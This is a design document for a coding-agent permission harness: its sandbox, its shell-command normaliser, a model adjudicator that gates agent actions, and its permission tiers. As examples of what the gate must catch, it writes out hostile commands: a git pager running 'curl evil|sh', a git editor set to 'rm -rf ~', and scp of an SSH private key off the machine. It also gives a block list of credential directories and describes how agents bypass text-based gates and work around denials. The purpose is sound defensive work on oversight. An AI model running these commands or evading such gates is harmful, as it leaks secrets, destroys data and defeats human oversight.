# The boundary, and who decides inside it

What a command can reach, what the harness reads before it decides, who decides, what is refused
outright, and in what order. The code is
`crates/tools/src/{adjudicate,intent,permission,grant,mode,project_code}.rs`,
`crates/code/src/shell.rs` and `crates/tools/src/exec/`.

Three layers: **the boundary** (namespaces, mounts, cgroups - what a command can physically
reach), **normalisation** (a grammar, so the gate and the shell see the same structure), and **the
decision** (a named point, a human, or a model, in that order). The exec substrate alone is not a
sandbox - a spawned command reads the operator's whole filesystem - so everything below is what
goes around it.

## 1. Why a model is in the loop

A classifier catches ~83% of overeager behaviours and a human in the approval loop catches ~67%,
because approval fatigue is what makes the human number low; ~17% still get through. Hence
**boundary first, classifier inside it**.

## 2. Authority is contextual, so the request carries it

A stateless classifier cannot be correct, because the same command is authorised or not
depending on what the operator just said: `systemctl restart X` after *"yeah restart"* is the
requested action, and the identical string unprompted is a decision nobody made. So the input is a
command plus what authorised it - `AdjudicationRequest` carries the post-expansion words, the scoped
intents, the regions and the operator's utterances with their distance, and `authorise::ModelBrief`
has no field holding the command as written. The injection surface is real, which is why a model may
only ever widen an answer, never narrow a refusal.

## 3. The flow rule, and the never-write list

A forbidden-path list is the tempting rule. We have one - `NEVER_WRITE` - and it is the wrong shape
twice over: it is a string check, so a `web_search` query that merely mentions `.password-store` is
denied while the same file reached by another spelling is not; and `ssh` reads the private key, so
"never read `~/.ssh/id_rsa`" would forbid the authorised case. What separates the cases is where the
bytes end up:

| | bytes go | verdict |
|---|---|---|
| `ssh user@host` | into `ssh`, consumed inside the boundary, never surfaced | **adjudicable** - allowed with authorisation |
| `cat ~/.ssh/id_rsa` | into a tool result, therefore the transcript, therefore the model's context and the store | **inexpressible** |
| `cp ~/.ssh/id_rsa /tmp/k` | to a location with weaker protection, and then anywhere | **inexpressible** |
| `scp ~/.ssh/id_rsa remote:` | off the machine | **inexpressible** |

Danger is not a property of the string - *"`rm -rf /` can be allowed if it is the intent"* - so there
is no block list of destructive commands: it would have to be widened by exception every time
somebody legitimately needed a listed command, which is how block lists die. Layer A emits an intent
with its scope, not a verdict and not a score.

The asymmetry that holds is who bears the consequence: destruction is authorisable because the person
authorising is the person harmed, and disclosure is not, because a yes does not bound where the bytes
go once they are in a context, a store and possibly a provider. The invariant, stated once:

> Secret bytes may be consumed by a process inside the boundary. They may never enter the
> transcript, and they may never leave the boundary.

That is a data-flow rule: it permits the authorised case without an exception, it is enforceable at a
real edge (what a tool returns, what crosses the network namespace) rather than at a spelling, and it
makes the prohibition structural. The two tiers are therefore **adjudicable** and **inexpressible**,
and no context, no classifier verdict and no operator instruction promotes the second into the first.
`FlowRule` is the enum the blocked tier carries: `SecretToTranscript`, `SecretToWeakerLocation`,
`SecretOffBox`, `SecretFlowUnknown` (a secret is an operand of a program whose data flow the harness
cannot state - refused rather than guessed, because an unrecognised program is not a program that
keeps secrets), and `WriteIntoSecretStore`.

### The never-write list

`NEVER_WRITE` (`adjudicate.rs`) is evaluated before any adjudicator and is overridable by none of
them, including at `allow-all`:

```
.ssh .gnupg .aws .kube .config/gh .password-store .mozilla .config/google-chrome
.config/chromium .git .config/BraveSoftware .config/microsoft-edge .config/vivaldi
.config/opera .thunderbird "Library/Application Support/Google/Chrome"
"Library/Application Support/Firefox" AppData/Local/Google/Chrome AppData/Roaming/Mozilla
.local/share/keyrings .gnome2/keyrings .config/gcloud .azure .config/op .config/Bitwarden
```

`.git/` is ours rather than the clause's (rewriting a ref is not something a tool can undo), the
browser entries are session-cookie stores, and the list is kept in step with the read-side
`intent::SECRET_DIRS`.

`never_hit` asks the question of the **spelling**: every string argument is split on `/` and `\`, and
a segment equal to an entry refuses (a multi-segment entry is matched against the whole string).
`ssh_resolution_hit` asks it of the **path**: a path argument, resolved through `remote::real`, that
lands inside the operator's ssh directory refuses even when the spelling is a symlink in the
workspace named `keys`. Arguments that are content and not a path - `content`, `old_string`,
`new_string`, `pattern`, `text`, `abstract`, `query` - are skipped, because a write's body names no
path; `bash`'s `command` is scanned word by word, the one place a string is the only evidence there
is.

## 4. The three layers

### Layer 1 - the boundary

`crates/tools/src/exec/confine.rs`. Two mechanisms, one contract: a `ViewSpec` in, a measured
`Boundary` out. `confine::probe` picks by platform - bubblewrap's namespaces on Linux, Seatbelt's
policy on macOS (§4k).

| | what is inside the view |
|---|---|
| the project | bound read-write **at its own path**, so a compiler's diagnostic names the same file the `read` tool names |
| the system roots | `--ro-bind-try` of `/usr`, `/bin`, `/sbin`, `/lib*`, `/etc/alternatives`, `ld.so.*`, `localtime`, `ssl`, `ca-certificates`, `nsswitch.conf`, `passwd`, `group`, `terminfo`: what `/bin/sh` needs to exist, not a security decision - the decision is everything not on it |
| `$HOME` | a fresh tmpfs at `/run/letibot/home`, or a letibot-owned directory bound there. Never the operator's |
| `/tmp` | a fresh tmpfs per command (`TmpView::PerCommand`), or one directory bound there for the session (`TmpView::Session`), so a two-call scratch idiom is not silently eaten. `/var/tmp` and `/run` are fresh tmpfs either way |
| `/proc`, `/dev` | this command's own procfs, showing only its PID namespace; a minimal device set |
| the network | an empty network namespace by default; the host's only with `Egress::Host` and the sentence that asked for it, plus `/etc/resolv.conf` and its friends - without which every name fails to resolve and the decision reads as no network at all |
| grants | a path the operator admitted, `--ro-bind` or `--bind`, each carrying the `why` that put it there. An agent socket is bound at a fixed `/run/letibot/agent.sock` so `SSH_AUTH_SOCK` inside does not carry the operator's path out; the key never enters the view |

The environment is cleared and a keep-list put back (`KEEP_ENV`: `PATH`, `TERM`, `LANG`, `LC_ALL`,
`TZ`) - absence beats denial applied to the environment. The argv: `--unshare-user --unshare-pid
--unshare-ipc --unshare-uts --unshare-cgroup`, plus `--unshare-net` unless egress was granted;
`--disable-userns --assert-userns-disabled` so a child cannot unshare its way back out;
`--die-with-parent`; and `--new-session` for a detached command (no controlling terminal, so
`TIOCSTI` cannot push characters into the operator's shell) but not for a pane or a remote command,
whose process group an interrupt has to be able to kill.

`Boundary` records what was **measured**, not what was asked for: a namespace is `Entered` (with the
inode read from inside), `SharedByDecision` (with the reason), or `NotEntered` - the state that
refuses; a property is `Held`, `Absent` (this OS cannot give it) or `Unverified` (it could have been
measured and was not, which is reported as unknown, never as held).

Two consequences of the seal. Inside a boundary **no user namespace can be created**: `unshare -U
true` is ENOSPC, which is `SealKind::NestedNamespaces` doing its job, so no test that spawns a real
`bwrap` (or opens a real `HostProcesses`, which wants a delegated cgroup v2) can pass from inside one.
Those suites take their `apparatus::present` branch, which is loud and green - "the boundary tests are
green here" therefore says nothing, and the suites must run on the merge gate. And a session's `/tmp`
directory must be a **subdirectory** of the daemon's scratch: bound at `/tmp` itself, the scratch would
put `job-<id>.out` inside the sandbox, where `rm -rf /tmp/*` deletes it.

`Boundary::encloses` is the whole test, and it is what §6 admits inside: user, mount and pid all
`Entered`; **both seals `Held`** rather than merely not-open - `NestedNamespaces` (a process inside
cannot `unshare` back out) and `NoNewPrivs` (or a setuid binary reachable inside is an escalation);
and egress `Denied`. The seal clause is stricter than `Boundary::complete` on purpose, because an
untested seal makes the claim *nothing here can escape* a claim with its evidence missing. The reaper
- a cgroup here, a process group on a remote - is not a fact of `Boundary`: a boundary only reaches
the gate through a process host built with one.

`Bwrap::probe` runs one shell script **inside the same argv a command is wrapped in** (both go
through `pieces_of`, so what was measured is what runs) and reads `ns <name> <inode>` back. The
harness's own inodes are read first, because they are the denominator and without them an inode from
inside proves nothing. The seals are tested by trying `unshare -U true` and by reading `NoNewPrivs`
out of `/proc/self/status` - the kernel's answer, not the helper's promise. A probe whose readback
cannot be parsed is treated as no boundary.

### Layer 2 - normalisation

`crates/code/src/shell.rs`, over `tree-sitter-bash`. Every harness that gates on a shell command
decides on a string the shell will reinterpret; GuardFall (Adversa AI, 2026-06-30) measured that
against eleven coding agents and ten were bypassable, because the agent inspects raw text while the
shell performs quote removal, expansion and argument construction afterwards. Parsing through a
grammar means the gate sees the structure the shell will execute: which binaries, which arguments,
which redirections, which substitutions, where the data flows. A construct the grammar cannot resolve
is **never classified as safe**.

An unresolvable construct in an argument position is **widened rather than refused**: the scope
becomes the widest it could reach (`Region::Unbounded`), the always-ask rules are judged on that real
scope (`rm -rf $X` fires `destruction_outside_the_project` exactly as `rm -rf /` does), and the point
decides. `echo "$?"` widens nothing `echo` can act on, so it stays a read. The ruling: *"in
allow-all, stop refusing a command because the grammar could not resolve a construct"* - *"an opaque
fragment means this could be any value, so the scope becomes the widest that construct could
reach"*.

Two cases still return `NotRun`, and both have no scope to widen: a **parse error** (the structure
itself may be misread - tree-sitter recovers by handing back a plausible tree) and a **program nobody
can name** (the intents are derived from it, so there is no verb to scope). `Baseline::resolved`
carries what was actually read, separately from the verdict, so no corpus row claims a resolution that
never happened and `Adjudicable` is never minted for an unresolved action.

### Layer 3 - the adjudicator

A small model, resident, seeing the normalised action plus the authorisation trail. It sits in the
tool path, so milliseconds not seconds, and it carries the consecutive-denial breaker: three
consecutive denials in one task direction and the loop stops and escalates to a human.

The failure mode designed first, because it is the one that turns a guard into a rubber stamp: **an
unavailable or timed-out adjudicator fails closed** - `NotRun`, nobody decided, never `Denied` (which
claims a decision) and never `Admit`. `NoAdjudicator` is the pattern.

`TaskDirection` is `(tool, intent set, effect scope, region set)` - not the arguments, which change on
every re-spelling so the counter would never reach three and the breaker would be measuring typing;
not the tool alone, which would let unrelated denials trip it. It over-merges, and every error mode
pushes toward asking a human, which is the direction a breaker should fail in.

Which model: an adjudicator has to be always on, so it must co-reside with the working model. The
dense Qwen3.8-27B is 23.6 GiB against ~22.3 GiB free, so it means swapping Flash-Next out;
Qwen3-Coder-Next Q4_K_M is 18.5 GiB and co-resides, tight once KV is counted.

## 4b. A denial the operator cannot see manufactures the workaround

> *"when it denies it doesnt surface it to me in anyway - and models including you then try to
> workaround the denial which sometime or mostly doesnt work and the task stops anyway"*

The chain shows the design causing the behaviour: the classifier denies, the operator is not told, the
model infers that the approach was wrong rather than that the action was forbidden, tries a variant -
the routing-around every rule in this repo forbids, induced by the design - and the task dies.

| party | must see |
|---|---|
| the model | that it was refused, by whom, on what basis - `NotRun` carries this |
| the operator | every denial, **when it happens**: it is a decision taken on their behalf and they alone can lift it |
| the durable log | all of it, for the corpus |

So a denial emits to the head immediately - not at turn end and not on request - through
`authorise::DenialSink`, and the grant path is reachable at the moment of denial. The refusal text has
to make **forbidden** unmistakable from **failed**, because that one distinction is what stops the
workaround.

## 4d. Four tiers, and earned authority

Layer A can misread intent and layer B is calibrated on nothing, and two uncertain layers composed
must not produce a confident auto-approve. So four outcomes, and they must not collapse:

| tier | who decides | when |
|---|---|---|
| `Blocked` | nobody, ever | secret bytes crossing the boundary - §3, and nothing else |
| `AlwaysAsk` | the operator, every time | layer A's fixed list, whatever layer B says |
| `MayApprove` | the model, if authorisation is clear | the rest, within earned scope |
| `Auto` | nothing is consulted | reads inside the boundary |

`Tier::is_adjudicable_by_model` is `MayApprove` and `AlwaysAsk` both, because the cards a fixed list
produces are what teach an operator to press allow-all. Combining findings across the stages of one
command takes the strictest, so a pipeline with one disclosing stage is a disclosing pipeline. A model
cannot promote out of the first two: it can only move `MayApprove` from ask to admit, and that is a
signature that cannot return `Admit` for those classes rather than a check a later refactor can
invert.

Earned authority: ship the narrowest useful authority, let every verdict and every override be a
corpus row, and widen only on a measured agreement rate for a named class. The seven hand-written
cases measured here are a smoke test, not a calibration; they settled two things - a *thinking* model
is the wrong shape for the tool path, and per-case accuracy flatters a model that always refuses, so
the metric is **pairwise discrimination**. Over-refusal is not the safe direction: it is the direction
that produces §4b's workaround loop.

### The always-ask list

A block list says *never*; an always-ask list says *the human decides this one, every time, however
confident anything is*. It is deterministic, it lives in layer A, and no classifier can shrink it -
only the operator can, and each removal is a recorded decision. `intent::ALWAYS_ASK` carries a reason
per entry, as a field rather than a comment, because a list without reasons gets emptied:

| rule | why |
|---|---|
| `privilege_escalation` | `sudo`, `su`, `pkexec`, a capability or setuid change: the action leaves the authority the session was given, so the session cannot be the thing that authorises it |
| `destruction_outside_the_project` | a delete whose target is not inside the workspace. The verb is not the problem - `rm -rf target/debug` is ordinary work - the scope is, and a deletion outside the project is a loss the operator did not scope when they opened the session |
| `network_egress_to_an_unseen_host` | a host this session has not reached before: first contact is where an exfiltration and a legitimate fetch look identical |
| `credential_use` | authenticating as the operator - `ssh`, `git push`, `gh`, `aws`, a key passed by identity flag. Using the key is fine when they said so, which makes it an ask and not an auto; disclosure of the key is blocked |
| `changes_its_own_rules` | the call writes the files that decide what may run unasked - the preapproved ruleset and the sensitive-path list. A session that can edit those can grant itself anything and then do it quietly |
| `persistence` | the action outlives the session - a cron entry, a unit enabled, a login item. A session ends; a foothold does not |
| `machine_power` | shutdown, reboot, halt: every process on the box, the operator's own included |
| `could_not_be_read` | layer A could not read the action at all, carried as `NotRun` rather than as this tier, and listed because "I could not read it" and "a human must read it" are one sentence. An unresolvable *argument* is no longer this: it widens instead |

## 4e. The points

Four axes - **role** (which tools are seated), **tier policy** (what asks, per access class), **grant
scope** (what persists from an answer) and **adjudicator** (who decides) - plus the boundary, which
says whether the always-ask list still reaches a person from this point. A point is a named coordinate
(`Mode` in `crates/tools/src/mode.rs`); unnamed coordinates stay legal.

Roles answer *which tools*, never *how much approval*. Conflating them is what produced the defect the
operator hit: `--role coder` meant both "has write" and "asks about writes", so a session without it
reported "no edit tools" with no way to change it in place.

| point | role | write | exec | network | grants | decided by | requires |
|---|---|---|---|---|---|---|---|
| `read-only` | orchestrator | absent | absent | absent | once | nobody | - |
| `always-ask` | coder | ask | ask | ask | once | a human | writable backend, a reachable adjudicator |
| `writes allowed` | coder | **admit** | ask | ask | session | a human | writable backend, a reachable adjudicator |
| `automode` | coder | ask | ask | ask | session | a model | the two above plus an oracle |
| `automode-edits` | coder | **admit** | ask | ask | session | a model | as `automode` |
| `allow-all` | coder | admit | admit | admit | session | nobody | writable backend, confinement |
| `allow-all (this box, consented)` | coder | admit | admit | admit | session | nobody | writable backend |

`read-only` is the only point where the tools are *absent* rather than refused, so nothing is claimed
that cannot be done. `allow-all` requires a confinement because on a bare host it is opencode's
`bypassPermissions` posture. `allow-all (this box, consented)` is the same point with the boundary
`OperatorConsented` and no confinement to require; it is deliberately **not** in `Mode::NAMED` - a
point that stands for a person's confirmation must not be selectable by a string - and the
confirmation is recorded with the project and the session, so it survives a restart and is read aloud
at every startup. `Mode::UNSEEN_PROJECT` is `always-ask`.

| prerequisite | what it is | how to attach it |
|---|---|---|
| `WritableBackend` | a backend opened for writing; an admitted write over a read-only backend is a session that starts cleanly and fails every call | the backend is opened writable when the seated role declares write access |
| `ReachableAdjudicator` | an adjudicator that can reach whoever decides - not "an adjudicator exists", since one over a daemon whose stdin nobody types into is attached and unreachable | attach a head, or run the daemon with `--adjudicator console` |
| `Oracle` | an `AuthorisationOracle`: a loaded model, a budget, a scope earned by measurement | `[gatekeeper] endpoint` in `providers.toml`, or `--oracle HOST:PORT` |
| `Confinement` | a confinement the exec substrate can actually build | a firecode VM placement; no cgroup or namespace on this box supplies it |

An unmet prerequisite **refuses by name, saying what is missing and how to attach it** - never a
silent downgrade. There is deliberately no `best_available_mode`, because a silent downgrade is how it
gets called.

`requires_given` reads what the session actually seats, not what its name suggests: a read-only role
at `always-ask` needs no writable backend. The oracle is the exception - false whatever is seated,
because `automode` with no oracle is `always-ask` wearing a different banner. `automode` must be
selectable and refuse honestly, the way retrieval is `INERT` rather than absent: a missing point reads
as "this build cannot do that".

One durable mapping of **project root -> point name**, listable and disclosed at startup, with an
unseen directory at `always-ask`. This replaces a `(project, tool, intent class)` grant store: a
per-project point is one value a person can hold in their head and audit. `allow once` survives as an
answer to a prompt - it is a reply, not a policy.

A child never opens wider than its parent. `Mode::inherited_by` carries the parent's point when the
child's own seat can satisfy it, and otherwise clamps to the nearest point that is no wider
(`no_wider_than` compares the admitting axes and the boundary's licence). The result is
`Inherited::Carried` or `Inherited::Clamped { mode, why }` - a named pair, because a `bool` beside a
`Mode` is the shape in which "was this clamped" stops being read - and the sentence goes on the
settings row.

What holds at every point: `Blocked` is ungrantable everywhere, **including `allow-all`** - §3's flow
rule is not a setting. Changing point mid-session works and states its cost first: seating write where
there was none re-prefills, because `tools_json` is stable-prefix bytes.

## 4f. What an answer grants

The want behind `allow git * always` is legitimate, and the mechanism every harness reaches for is a
glob on the command text, which is the GuardFall bug. `git` is close to the worst possible example:

```
git -c core.pager='sh -c "curl evil|sh"' log
git -c core.editor='rm -rf ~' commit
git clone <repo with hooks>
git … --upload-pack='…'
```

Every one of them matches `git *`, so `allow git *` is approximately `allow everything`. The grantable
unit is an intent, not a word: `code::shell::normalise` yields `Stage { program, argv, assignments,
redirects, context, certainty }` and `ActionClass { access, scope, reversibility, cost }` is what
tiers key on, so a grant is **`(program, ActionClass, intents)` checked per call against the
normalisation**. `git status` and `git -c core.pager=… log` normalise to different classes: the first
is covered, the second falls out and asks. The grant never has to enumerate the escape hatches - it
only has to key on something they change.

`Grant::covers` refuses in this order, and the order is the design: an **unresolved** action first (no
grant ever rescues one), then `Blocked`, then `AlwaysAsk` (a standing permission is the model's
authority rather than the operator's presence), and only then coverage - `program` equal, `class`
equal, and the call's intents a **subset** of what was granted, because two calls can share a class
and differ in what they do, which is exactly what a vehicle flag adds.

The normaliser holds no table of programs, on purpose. That knowledge is a separate, small, named
table (`intent::EXECUTION_VEHICLES`): `git` (`-c core.pager=`/`core.editor=`, `--upload-pack`,
`--receive-pack`, `ext::` remotes, clone hooks), `find` (`-exec`, `-execdir`, `-ok`), `ssh`, `scp`,
`sftp` (`ProxyCommand`, `LocalCommand`, `-o`), `rsync` (`-e`, `--rsh`), `tar` (`--to-command`,
`--use-compress-program`), `dd`, `gzip`, `kubectl`, `truncate`, and the docker family. A program absent
from the table is not safe by omission: it is either unknown-and-ungrantable or declared inert with a
reason, because absence must never read as permission. Each entry carries a `provenance` -
`HandWritten` today, `Documented { source }` for an answer derived from a program's own manual, which
nothing produces yet. A classification of an unknown program is **not a verdict unless it cites what
it read**: an uncited guess is `NotRun` - nobody checked - not a safe default. And `man git` is not
`./tool --help`: a system man page is part of the OS install, while a project-local binary's `--help`
is attacker-controlled content, so the classifier reads **system documentation paths**.

Globbing stays first-class, because a permission system whose safe path is too rigid gets turned off
wholesale and then nothing is guarded. The workflow is: the model proposes, the operator approves -
asked to stop being prompted about git, the model writes the list split by what the commands do
(`status|log|diff|show` as reads, `push|commit|merge` as writes). What a glob does not get is silence:

- it is shown in class terms before it is accepted - *"this matches 47 commands, including 3 that can
  execute arbitrary code"* - which is informed foot-shooting rather than blind;
- it can reach `MayApprove` and `AlwaysAsk`; it can never reach `Blocked`. You can shoot your foot;
  you cannot shoot your head;
- it never covers an unresolvable normalisation: if layer A could not read the command, no pattern
  agrees with it, and the refusal reads the resolution flag rather than the verdict.

## 4g. What the adjudicator is shown

| # | input | where it comes from |
|---|---|---|
| 1 | the normalised action - intent, scope, program class | layer A (`code::shell::normalise` + the vehicle table) |
| 2 | the authorisation trail - what the operator said, and how long ago | `AuthorisationTrail`, filled from the transcript |
| 3 | standing config - `ALWAYS_ASK`, the vehicle table, the operator's globs, the project's point | §4e, §4f |
| 4 | previous answers - what was decided on actions of this shape before | the audit rows |

The join between 1 and 2 is the actual problem: `"yeah restart"` and `systemctl --user restart
glm.service` have to be recognised as the same thing. That is not classification and not parsing, it
is alignment between a human utterance and a normalised action, and it is the only part that genuinely
needs a language model. Everything else in the four is lookup.

History is evidence, never precedent, or an answer given once by accident argues for itself forever:
prior answers are **shown to the decision, not substituted for it**, they carry their count and their
age (*"once, three weeks ago"* and *"nine times this week"* are different facts), **a denial is
history too**, and they never lift a tier.

## 4i. What the parser reads

Layer A's reading is what the oracle is shown and what every shape and grant is keyed on, so a
construct it cannot resolve is not a neutral fact: a session grant can never cover an unread action, a
shape can never settle one, and the region set widens to everywhere.
`crates/tools/src/corpus_replay.rs` and `examples/gate_corpus.rs` re-run today's `Baseline`,
`shell::shape` and grant key over a decision export, so what is claimed about the parser can be
counted against the only thing it applies to - the decisions already taken:

```sh
cargo run --offline -p letibot-tools --example gate_corpus -- \
  --home /home/dead --workspace /home/dead/Projects/<repo> ~/letibot-corpus/<host>.json
```

The paths are arguments because the exports hold the operator's own sessions. The sweep streams the
file, never reads a script off disk, never runs a shell, and prints counts; `LETIBOT_CORPUS_SHOW=n`
adds request ids and readings, never command text. Two facts about the export have to be known before
any number means anything: the verdict has three spellings (the baseline summary's *"the meaning was
never resolved"*, the older `not_run` token, and `boundary:normaliser`), and the corpus does not record
the workspace, so intents are comparable but regions are not.

### 4i.2 What is unread now

Of 161,097 `bash` decisions (lab2x1 134,428, mac 26,180, lubuntu1 489), **9,916 are unread - 7,533 /
2,353 / 30, or 5.6% / 9.0% / 6.1%.** Nearly all of it is a value nobody wrote down:
`parameter_expansion` (3,999 commands on lab2x1, 1,831 of them unread for it alone),
`command_substitution_value` (4,985 / 2,725), `arithmetic_expansion`, `process_substitution_path`,
`compound_argument`, `expanded_heredoc` - plus `parse_error` (§4i.7). `brace_expansion` and
`ansi_c_escapes` are at **0** on every host: nothing the text decides is left in the list.

### 4i.3 What resolves, and why each is safe

- **The shell's own numbers.** `$?` was the largest single reason a command was unread, and one idiom
  - a build or a test, then `echo "exit=$?"`. The value is not in the text and never will be, but its
  reach is: a status is 0-255, `$#` is a count, `$$` and `$!` are pids, `$RANDOM` and `$LINENO` are
  small integers, and a number names no directory. The resolver writes the number `0` back
  (`intent/parameters.rs`, `NUMERIC`) and the audit row says why. Not covered: `$@`, `$*`, `$1`, `$0`,
  `$-` and every name nobody assigned - those can be paths.
- **A `for` over a list the command spells** is unrolled: the body is walked once per value with the
  variable bound, so the stages, regions, intents and shape are the ones that will run. Not unrolled:
  a glob list, an expansion list, a quoted value that splits into several words, and more than 32
  values. Certainty stays *conditional* - a loop body is still a loop body.
- **A transform of a value is not the value.** The grammar reports the same `variable_name` for
  `${X}`, `${#X}`, `${X%…}`, `${X/a/b}`, `${X:0:3}` and `${!X}`; keying on the name read all six as
  `$X`, a claim about a command nobody wrote. The check is lexical, against the operator's own text.
- **Brace expansion is the words bash makes of it**, in bash's order (leftmost outermost, rightmost
  fastest: `x{1,2}{3,4}` is `x13 x14 x23 x24`), with bash's corners - an empty alternative makes no
  word, `{{a,b}}` is `{a}` and `{b}`, `{-01..3}` pads to the sign. Bounded at 32 words, and past the
  bound the word is **unread** rather than a literal, because a literal would claim the program
  receives braces it does not. A brace beside a quoted literal is one of those words (`"x"{a,b}` is
  `xa xb`), because a quote is not an expansion and the brace stands outside it. Still unread: an
  alternative holding an expansion or whitespace, a brace INSIDE quotes, where which brace is which
  cannot be said, and `{,}` whose argument vanishes. A `for` list of braces is unrolled like any
  literal list, so `for i in {1..3}` is the three passes bash makes of it.
- **`$'…'` is decoded into the bytes the program receives**: `\n`, `\t`, `\xHH`, `\NNN`, `\uHHHH`,
  `\UHHHHHHHH`, `\cX`, each arm taken from `od -tx1` of what bash 5.2 delivered rather than from the
  manual - which is how the odd ones were got right (`\x` with no digit keeps its backslash, `\x4` is
  `0x04`, `\1011` is `A1`, `\c?` is DEL). An escape whose bytes are not a string this can carry stays
  unread.
- **`$(pwd)` is `$PWD`** - the one substitution whose value is in the text, and the idiom agents write.
  Only that spelling: `$(pwd -P)`, `$(cd x && pwd)` and `$(dirname $(pwd))` stay unread, and the inner
  command is still listed as its own stage.
- **Five shapes the census found were ours, not the grammar's.** A `$` that ends a word comes back as
  the bare token (`echo x$$`, `cargo nextest -E run=^$`) and a lone `$` is a literal dollar. A bare
  `variable_name` in an argument position (`export SKIP_SLT`). A whole command in an argument position
  (`time ( … )`, `! ( … )`) hung off the `command` node with its commands never walked, so
  `time (cargo test …)` produced no stage for `cargo` and no redirect for its log - it is walked now
  and named `compound_argument`, and the command stays unread because how a compound's value relates
  to the stage's argv is not stateable. And a brace inside quotes, where
  `gh api graphql query='{repository(…)}'` looked like an expansion: the check now runs on the text
  with every quoted character blanked. And the here-document body whose first byte is a backslash,
  which came back as an argument word of the redirect with an EMPTY body and so read as a program
  that writes nothing: the body is taken from the text instead, and an unquoted one holding a
  backquote, a `$` or a quoting backslash is unread, because the shell expands those and the bytes
  the program reads are not the bytes written.

### 4i.4 What is still unread, and why it stays that way

- **`$PATH`** is resolved now (§4j.5), and the objection that blocked it is answered rather than
  ignored: a stage under a `PATH` the command set is renamed to the file it will run, so a grant for
  `cargo` cannot settle a stage that runs another `cargo`. Where the gate cannot see the disk the
  command will run on - a remote placement, a VM, a **confined** session, a corpus replay - the `PATH`
  is left unresolved exactly as it was.
- **`$(…)`**: the command inside is read and listed; the bytes it will produce are not in the text.
- **Variables a previous command assigned** are resolved against the session's environment where one
  was observed (§4j) or against the pairs every spawn is given.
- **`parse_error`**: the grammar's own limits, by cause - §4i.7.
- **`process_substitution_path`**: the shell invents `/dev/fd/N` at runtime; the inner command is
  already read and listed.
- **`arithmetic_expansion`**, **`compound_argument`** and **`expanded_heredoc`**: arithmetic reads
  variables, and the other two are named rather than guessed.

What the parser bought a person: an unresolved action can never be covered by a grant taken over its
neighbours, so every command it learned to read makes the answers already given reach further.

### 4i.7 The parse errors, by cause

| cause | lab2x1 | mac | whose |
|---|---|---|---|
| a read-write redirect `<>` | 207 | 8 | the grammar |
| a here-document followed by another operator on its line | 122 | 4 | the grammar |
| the text is not a command this grammar reads | 96 | 22 | see below |
| a token the resolver does not name | **0** | **0** | ours - fixed |
| **total** | **425** | **34** | |

A quarter of the class was never the grammar: `partial == false` means the tree has no `ERROR` node and
no `MISSING` one, so the grammar read every byte and the resolver's own fall-through called it a parse
error - the two spellings §4i.3 fixes. The third row splits under `bash -n`: 63 of the 96 and 11 of
the 22 are text bash itself refuses (a truncated command, Lisp source inside a single-quoted argument,
a heredoc terminator that never comes), and for those the gate is right. The rest bash accepts, and
inspection found two more shapes: `%(…)` in a word, and a pair of backquotes inside an *unquoted*
here-document body, whose prose the shell would expand.

The grammar's three, each reproduced minimally, and what this tree does with each. Each is one node
away from a class of commands rather than one command - `3<>/dev/tcp` is how this operator probes
whether a port is open and `<<'SQL' 2>&1 | head` is how they run a query and look at its head:

```sh
# 1. The read-write redirect. This grammar's `file_redirect` has < > >> <& >& &> &>> and no
#    <>, so the operator recovers as an ERROR on one of the two characters.
exec 3<>/dev/tcp/127.0.0.1/5432

# 2. A here-document operator followed by ANOTHER redirect and then a pipe. `cat <<'EOF' |
#    tail` parses; `cat <<'EOF' 2>&1 | tail` does not.
cat <<'EOF' 2>&1 | tail -3
x
EOF

# 3. `%(…)` in a word: a MISSING `;` is inserted at the end of the command.
git for-each-ref --format=%(refname)
```

**Read now: the read-write redirect.** The recovery is sound when the redirect is whole - the
descriptor and the destination both land where bash puts them, the `>` ERROR between them is the
operator's second character - so `crates/code/src/shell.rs` reads the operator from the text and
credits the recovery, and `exec 3<>/dev/tcp/…` (this tree's own fleet port probe) resolves. Two
spellings are still refused, and the refusal names the operator: with no descriptor (`<>file`) the
tree holds two redirects where the shell opens one, and a destination the recovery swallowed as a
second word (`exec 3<>file cat`) is not credited either.

**Refused with the shape named: the other two.** Neither is text anybody can be talked out of, but
a refusal that says "the grammar could not read this" tells a model nothing it can act on, so each
now carries its own sentence:

- The here-document one is the grammar hanging the rest of the line off the redirect: the pipeline's
  `|` arrives inside the `2>&1`. The same redirect written before the `<<`
  (`cat 2>&1 <<'EOF' | tail`) is the same command and parses, and the refusal says so.
- `%(…)` is not a command bash runs either: `(` after an unquoted `%` is a syntax error, and the
  grammar's recovery lists the bracketed word as a command that runs. The refusal says what the
  shell says and names the quoted word (`--format='%(refname)'`), which both read.

Both are still worth filing upstream - a fix there retires the refusal rather than rewording it.
The counts in §4i.7 are the ones taken before this and are not re-measured here.

## 4j. The session's environment, as it is observed

`ShellSession` (`crates/tools/src/exec/shell.rs`) is the only thing in the tree with a trailer, and
**no production code constructs one**: `grep -rn "ShellSession::open" crates/` answers its own tests
and nothing else. The model's `bash` tool opens no shell: every call is a fresh process
(`exec/host.rs::spawn`) - `/bin/sh -c <command>`, `env_clear()`ed, then given the pinned `PATH`, the
daemon's `standing_env` (`HOME`, `LETIBOT_SOCKET`, `LETIBOT_SESSION`, `SUDO_ASKPASS`,
`Config::build_env`) and the request's own pairs. So a variable an earlier `bash` call exported is not
in the next call's environment, whatever the transcript looks like.

What the next call will really see is exactly the pairs the harness sets, which the daemon knows before
it spawns - so a tracked environment *seeded from those pairs* is true by construction
(`harness::surroundings_for`): the pinned `PATH`, `HOME` and `Config::build_env`, and the keep-list a
boundary passes through (`exec::confine::KEEP_ENV`), which is `--clearenv`'d and re-`--setenv`'d from
*this* process's environment and so is seeded for a local placement only. Nothing observes a call's own
final environment or carries it forward: doing either makes the shell stateful, which is the class of
change `sets_state_for_later` exists to refuse a durable rule over.

### 4j.2 Where it is observed: the trailer

The session's shell - the one a `!` line runs at - ends every line with an OSC trailer carrying `$?`
and `$PWD`. It carries a third field, and the separator is a **newline** rather than another `;`:

```text
ESC ] 1337 ; letibot ; <nonce> ; <status> ; <cwd> \n NAME=value;NAME=value; … BEL
```

A newline, because it is the one byte neither of the other two fields can hold: the status is a number,
a carried value is one plain word, and a `cwd` is the only field that could contain either - so the
reader splits on the first newline and parses the head exactly as before, including a `cwd` that
contains a `;`.

`shell::trailer_definition` is defined once at session start: a `for` over `compgen -e` reading each
value with bash's indirect expansion `${!n}`, a `case` glob (`''|*[!A-Za-z0-9_./:@%,-]*`) that
**drops every value that is not already one plain word**, and a length test - so the shell sends only
what the resolver could ever write back. The alternatives all need a de-quoter and a wrong de-quote is
a wrong value: `env -0` does not exist on macOS, `export -p` prints with the shell's own quoting one
dialect per shell, and `env | base64` is two forks with a newline still ambiguous.

